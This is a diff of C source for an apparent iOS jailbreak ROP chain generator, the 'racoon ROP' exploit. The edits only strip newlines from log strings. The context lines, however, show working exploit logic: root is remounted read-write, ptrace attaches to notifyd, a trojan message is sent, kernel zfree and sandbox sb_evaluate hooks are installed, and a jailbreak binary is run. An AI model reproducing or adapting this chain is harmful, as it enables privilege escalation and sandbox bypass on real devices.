@@ -47,7 +47,7 @@ Addr mountArgs;
 
 void _unmount(Addr vndevice, Addr mntPoint)
 {
-    // ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Unmounting: %s\n"), mntPoint);
+    // ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Unmounting: %s"), mntPoint);
 
     ropCall2(dscs + offsets->_dsc_unmount, mntPoint, 0);
 
@@ -62,12 +62,12 @@ void _unmount(Addr vndevice, Addr mntPoint)
 
 void prepareMount(Addr vndevice, Addr mntPoint, char* vnimage)
 {
-    // ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Creating directory: %s\n"),
+    // ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Creating directory: %s"),
     // mntPoint);
 
     ropCall2(dscs + offsets->_dsc_mkdir, mntPoint, 0777);
 
-    // ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Attaching vndevice: %s\n"),
+    // ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Attaching vndevice: %s"),
     // vndevice);
 
     ropCall2(dscs + offsets->_dsc_open, vndevice, O_RDONLY);
@@ -89,7 +89,7 @@ void prepareMount(Addr vndevice, Addr mntPoint, char* vnimage)
 
 void _mount(Addr vndevice, Addr mntPoint)
 {
-    // ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Mounting vndevice to: %s\n"),
+    // ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Mounting vndevice to: %s"),
     // mntPoint);
 
     ropLoadReg0Const(vndevice);
@@ -106,7 +106,7 @@ void _mount(Addr vndevice, Addr mntPoint)
 
 void _remountroot()
 {
-    ropLog("* Remounting root read-write...\n");
+    ropLog("* Remounting root read-write...");
     Addr remountArgs = newBuffer(sizeof(struct hfs_mount_args));
 
     ropLoadReg0Const(0);
@@ -124,7 +124,7 @@ void _remountroot()
     ropCall4(dscs + offsets->_dsc_mount, p1, p2, MNT_UPDATE, remountArgs);
 
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c);
-    ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("* mount returned: %d\n"),
+    ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("* mount returned: %d"),
              PLACE_HOLDER);
 }
 
@@ -132,7 +132,7 @@ void bootstrap()
 {
     _remountroot();
 
-    ropLog("* Starting kernel exploit...\n");
+    ropLog("* Starting kernel exploit...");
 
     ptrFd = newInteger(0);
     vn = newBuffer(sizeof(struct vn_ioctl));
@@ -176,7 +176,7 @@ void bootstrap()
     }
     else
     {
-        fprintf(stderr, "Error opening '%s'\n", fileName);
+        fprintf(stderr, "Error opening '%s'", fileName);
     }
     for (j = 0; j < 0x80; j++)
     {
@@ -216,7 +216,7 @@ void bootstrap()
     }
     else
     {
-        fprintf(stderr, "Error opening '%s'\n", fileName);
+        fprintf(stderr, "Error opening '%s'", fileName);
     }
 
     // zfree hook
@@ -239,7 +239,7 @@ void bootstrap()
     }
     else
     {
-        fprintf(stderr, "Error opening '%s'\n", fileName);
+        fprintf(stderr, "Error opening '%s'", fileName);
     }
 
     // invalidate all dcache
@@ -271,7 +271,7 @@ void bootstrap()
     }
     else
     {
-        fprintf(stderr, "Error opening '%s'\n", fileName);
+        fprintf(stderr, "Error opening '%s'", fileName);
     }
 
     // sb_evaluate hooker
@@ -294,7 +294,7 @@ void bootstrap()
     }
     else
     {
-        fprintf(stderr, "Error opening '%s'\n", fileName);
+        fprintf(stderr, "Error opening '%s'", fileName);
     }
 
     // sb_evaluate hook
@@ -317,7 +317,7 @@ void bootstrap()
     }
     else
     {
-        fprintf(stderr, "Error opening '%s'\n", fileName);
+        fprintf(stderr, "Error opening '%s'", fileName);
     }
 
     // invalidate all dcache
@@ -346,7 +346,7 @@ void bootstrap()
 
     // -------------------------------------------------------------
 
-    ropLog("* Finished. Executing hello.\n");
+    ropLog("* Finished. Executing hello.");
 
     ropCall2(dscs + offsets->_dsc_chmod, newString("/var/mobile/Media/corona/jailbreak"), 0755);
     unsigned int p2 = newString("/var/mobile/Media/corona/jailbreak");
@@ -357,7 +357,7 @@ void bootstrap()
 
 void exploit()
 {
-    ropLog("Entering racoon ROP.\n");
+    ropLog("Entering racoon ROP.");
 
     Addr aShmBaseAddress = newInteger(0);
     ropCall3(dscs + offsets->_dsc_shm_open, newString("apple.shm.notification_center"),
@@ -368,7 +368,7 @@ void exploit()
     ropAddReg0Const(0xF00);
     ropSaveReg0(aShmBaseAddress);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
-    ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("shmBaseAddress: %x\n"),
+    ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("shmBaseAddress: %x"),
              PLACE_HOLDER);
 
     Addr aStat = newInteger(0);
@@ -500,11 +500,10 @@ void exploit()
     ropSubReg0Const(137);
     ropDerefReg0();
 
-    // ropSyslog(LOG_WARN, "notifyd pid: %d\n", aPid);
+    // ropSyslog(LOG_WARN, "notifyd pid: %d", aPid);
     ropSaveReg0(aPid);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
-    ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("notifyd pid: %d\n"),
-             PLACE_HOLDER);
+    ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("notifyd pid: %d"), PLACE_HOLDER);
 
     Addr aShmAddress = newInteger(0);
     Addr aRegion = newInteger(0); // pod2g: why not uint64_t ?
@@ -556,13 +555,13 @@ void exploit()
     ropLoadReg0(aPort);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
     ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING,
-             newString("Looked up notification center: %p\n"), PLACE_HOLDER);
+             newString("Looked up notification center: %p"), PLACE_HOLDER);
 
     // ropPtrace(PT_ATTACH, aPid, 0, 0);
     ropLoadReg0(aPid);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
     ropCall4(dscs + offsets->_dsc_ptrace, PT_ATTACH, PLACE_HOLDER, 0, 0);
-    ropLog("attached to notifyd\n");
+    ropLog("attached to notifyd");
 
     // ropSleep(1);
     ropLog("sleeping...");
@@ -573,13 +572,13 @@ void exploit()
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
     ropCall4(dscs + offsets->_dsc_ptrace, PT_CONTINUE, PLACE_HOLDER,
              dscs + offsets->_dsc_bsdthread_terminate, 0);
-    ropLog("continuing...\n");
+    ropLog("continuing...");
 
     // ropPtrace(PT_DETACH, aPid, 0, 0); // please???
     ropLoadReg0(aPid);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
     ropCall4(dscs + offsets->_dsc_ptrace, PT_DETACH, PLACE_HOLDER, 0, 0);
-    ropLog("detached!!!\n");
+    ropLog("detached!!!");
 
     // ropSleep(1);
     ropLog("sleeping...");
@@ -604,7 +603,7 @@ void exploit()
 
     ropLoadReg0(aLocalPort);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
-    ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Local port: %p\n"), PLACE_HOLDER);
+    ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Local port: %p"), PLACE_HOLDER);
 
     struct trojan_msg msg;
 
@@ -641,7 +640,7 @@ void exploit()
     ropLoadReg0(aPid);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
     ropCall4(dscs + offsets->_dsc_ptrace, PT_ATTACH, PLACE_HOLDER, 0, 0);
-    ropLog("attached to notifyd\n");
+    ropLog("attached to notifyd");
 
     // ropSleep(1);
     ropLog("sleeping...");
@@ -710,13 +709,13 @@ void exploit()
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
     ropCall4(dscs + offsets->_dsc_ptrace, PT_CONTINUE, PLACE_HOLDER, dscs + offsets->GADGET_HOLY,
              0);
-    ropLog("continuing...\n");
+    ropLog("continuing...");
 
     // ropPtrace(PT_DETACH, aPid, 0, 0); // please???
     ropLoadReg0(aPid);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
     ropCall4(dscs + offsets->_dsc_ptrace, PT_DETACH, PLACE_HOLDER, 0, 0);
-    ropLog("detached!!!\n");
+    ropLog("detached!!!");
 
     // ropSleep(1);
     ropLog("sleeping...");
@@ -724,7 +723,7 @@ void exploit()
 
     // -------------------------------------------------------------
 
-    ropLog("Racoon ROP ended.\n");
+    ropLog("Racoon ROP ended.");
     ropCall1(dscs + offsets->_dsc_exit, 0);
 }
 
@@ -744,7 +743,7 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
 
     if (firmware == -1)
     {
-        fprintf(stderr, "Unrecognized firmware: %s\n", firmwareName);
+        fprintf(stderr, "Unrecognized firmware: %s", firmwareName);
         return -1;
     }
 
@@ -759,7 +758,7 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
 
     if (device == -1)
     {
-        fprintf(stderr, "Unrecognized device: %s\n", deviceName);
+        fprintf(stderr, "Unrecognized device: %s", deviceName);
         return -1;
     }
 
@@ -776,7 +775,7 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
     f = fopen(fName, "rb");
     if (!f)
     {
-        fprintf(stderr, "ERROR: missing file '%s'\n", fName);
+        fprintf(stderr, "ERROR: missing file '%s'", fName);
         return -2;
     }
     fclose(f);
@@ -785,7 +784,7 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
     f = fopen(fName, "rb");
     if (!f)
     {
-        fprintf(stderr, "ERROR: missing file '%s'\n", fName);
+        fprintf(stderr, "ERROR: missing file '%s'", fName);
         return -2;
     }
     fclose(f);
@@ -794,7 +793,7 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
     f = fopen(fName, "rb");
     if (!f)
     {
-        fprintf(stderr, "ERROR: missing file '%s'\n", fName);
+        fprintf(stderr, "ERROR: missing file '%s'", fName);
         return -2;
     }
     fclose(f);
@@ -803,7 +802,7 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
     f = fopen(fName, "rb");
     if (!f)
     {
-        fprintf(stderr, "ERROR: missing file '%s'\n", fName);
+        fprintf(stderr, "ERROR: missing file '%s'", fName);
         return -2;
     }
     fclose(f);
@@ -812,7 +811,7 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
     f = fopen(fName, "rb");
     if (!f)
     {
-        fprintf(stderr, "ERROR: missing file '%s'\n", fName);
+        fprintf(stderr, "ERROR: missing file '%s'", fName);
         return -2;
     }
     fclose(f);
@@ -821,7 +820,7 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
     f = fopen(fName, "rb");
     if (!f)
     {
-        fprintf(stderr, "ERROR: missing file '%s'\n", fName);
+        fprintf(stderr, "ERROR: missing file '%s'", fName);
         return -2;
     }
     fclose(f);
@@ -867,7 +866,7 @@ int generate_rop(FILE* out, int is_bootstrap, const char* firmwareName, const ch
 
     if (firmware == -1)
     {
-        fprintf(stderr, "Unrecognized firmware: %s\n", firmwareName);
+        fprintf(stderr, "Unrecognized firmware: %s", firmwareName);
         return -1;
     }
 
@@ -882,7 +881,7 @@ int generate_rop(FILE* out, int is_bootstrap, const char* firmwareName, const ch
 
     if (device == -1)
     {
-        fprintf(stderr, "Unrecognized device: %s\n", deviceName);
+        fprintf(stderr, "Unrecognized device: %s", deviceName);
         return -1;
     }
 
@@ -919,7 +918,7 @@ int main(int argc, char* argv[])
     {
         fprintf(stderr,
                 "syntax: %s <is_bootstrap, 0|1> <firmware> <device> <pid length> <dyld shared "
-                "cache slide, ex: 0x40000>\n",
+                "cache slide, ex: 0x40000>",
                 argv[0]);
         exit(1);
     }
@@ -930,7 +929,7 @@ int main(int argc, char* argv[])
     sscanf(argv[1], "%d", &is_bootstrap);
     sscanf(argv[4], "%d", &pid_len);
     sscanf(argv[5], "0x%x", &slide);
-    fprintf(stderr, "pid length: %d, dyld shared cache slide: 0x%x\n", pid_len, slide);
+    fprintf(stderr, "pid length: %d, dyld shared cache slide: 0x%x", pid_len, slide);
 
     return generate_rop(stdout, is_bootstrap, argv[2], argv[3], pid_len, slide);
 }
